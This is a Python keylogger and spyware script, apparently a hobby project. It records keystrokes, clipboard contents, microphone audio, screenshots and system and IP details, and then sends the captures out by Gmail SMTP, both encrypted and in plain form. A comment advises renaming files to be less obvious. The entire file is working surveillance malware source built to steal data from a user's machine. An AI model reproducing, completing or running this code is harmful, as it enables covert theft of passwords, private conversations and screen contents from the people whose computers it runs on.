# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import datetime
import socket
import platform
import pyperclip
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import threading

log_filename = f"keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
encryption_key = "encryption.key"

#encryption file names (rename to be less obvious if needed))
keys_information_e = "e_keys_info.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10  #seconds to record microphone audio
time_iteration = 15  #seconds to run keylogger
number_of_iterations_end = 3  #number of iterations to run keylogger

#add email and password for sending email (will need 2FA Enabled and app password generated (16 digit code)))
#email_address =  #sending email address
#password = #email password (16 digit app password)

#toaddr =  #recieving address email


#change key below to the key generated from generate key file
key = " " #from generate key file

file_path = f"/Users/{getpass.getuser()}/Desktop/Key Stroke Identifer Project/"
extend = "/"
file_merge = file_path + extend

#email sending function
def send_email(filenames, attachments, toaddr):
    try:
        fromaddr = email_address
        
        msg = MIMEMultipart()
        msg["From"] = fromaddr
        msg["To"] = toaddr
        msg["Subject"] = "Keylogger Project Files"
        
        body = "Attached are the system info and keystroke info files"
        msg.attach(MIMEText(body, "plain"))
        
        # Attach each file
        for filename, attachment_path in zip(filenames, attachments):
            with open(attachment_path, 'rb') as attachment_file:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment_file.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f"attachment; filename= {filename}")
                msg.attach(p)

        
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        
        print("Email sent successfully")
        
    except Exception as e:
        print(f"Failed to send email: {e}")

#for getting system information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        
        except Exception:
            f.write("Could not get Public IP Address (most likely is offline)\n")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

#computer_information()

#for getting clipboard data
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            clipboard = pyperclip.paste()
            f.write("Clipboard Data: \n" + clipboard + "\n")
        except Exception:
            f.write("Could not copy clipboard data\n")

#copy_clipboard()

#for getting audio information
def microphone():
    try:
        sample_frequency = 44100
        seconds = microphone_time
        
        print(f"Recording audio for {seconds} seconds...")
        myRecording = sd.rec(int(seconds * sample_frequency), samplerate=sample_frequency, channels=1)
        sd.wait()
        write(file_path + extend + audio_information, sample_frequency, myRecording)
        print("Audio recording complete")
        
    except Exception as e:
        print(f" Microphone error: {e}")
        with open(file_path + extend + audio_information, "w") as f:
            f.write("Audio recording failed")

#microphone()

def screenshot():
    try:
        img = ImageGrab.grab()
        img.save(file_path + extend + screenshot_information)
        print("Screenshot taken!")
        
    except Exception as e:
        print(f"Screenshot error: {e}")
    
#screenshot()

count = 0
keys = []
current_time = time.time()
stopping_time = time.time() + time_iteration

def key_on_press(key):
    global keys, count, current_time
    
    print(key)
    keys.append(key)
    count = count + 1
    current_time = time.time()
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + log_filename, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write(' ')
            elif "enter" in k:
                f.write('\n')
            elif "Key" not in k:
                f.write(k)

def key_on_release(key):
    global current_time, stopping_time
    
    if key == Key.esc:
        return False
    if current_time > stopping_time:
        return False

computer_information()

# Start audio recording in background
audio_thread = threading.Thread(target=microphone)
audio_thread.start()

# Run keylogger iterations
number_of_iterations = 0

while number_of_iterations < number_of_iterations_end:
    
    # Reset timer
    current_time = time.time()
    stopping_time = time.time() + time_iteration
    
    # Start keylogger
    with Listener(on_press=key_on_press, on_release=key_on_release) as listener:
        listener.join()
    
    # Take screenshot and update clipboard
    screenshot()
    copy_clipboard()
    
    number_of_iterations += 1
    
    if number_of_iterations < number_of_iterations_end:
        time.sleep(1)

# Wait for audio
audio_thread.join()

# Encrypt files
files_to_encrypt = [file_merge + log_filename, file_merge + system_information, file_merge + clipboard_information]
encrypted_files = [file_merge + keys_information_e, file_merge + system_information_e, file_merge + clipboard_information_e]

count = 0
for i in files_to_encrypt:
    try:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()
        
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        
        with open(encrypted_files[count], 'wb') as f:
            f.write(encrypted)
        
        print(f"Encrypted: {encrypted_files[count]}")
        count += 1
    except Exception as e:
        print(f"Encryption error: {e}")
        count += 1

# Send encrypted files
for encrypted_file in encrypted_files:
    filename = encrypted_file.split('/')[-1]  # Get just the filename
    send_email([filename], [encrypted_file], toaddr)

time.sleep(10)  #wait 10 seconds before sending unencrypted files

# Send email with keylog info, system info, clipboard info
filenames = [log_filename, system_information, clipboard_information, audio_information, screenshot_information]
attachments = [
    file_path + extend + log_filename,
    file_path + extend + system_information,
    file_path + extend + clipboard_information,
    file_path + extend + audio_information,
    file_path + extend + screenshot_information
]   
send_email(filenames, attachments, toaddr)
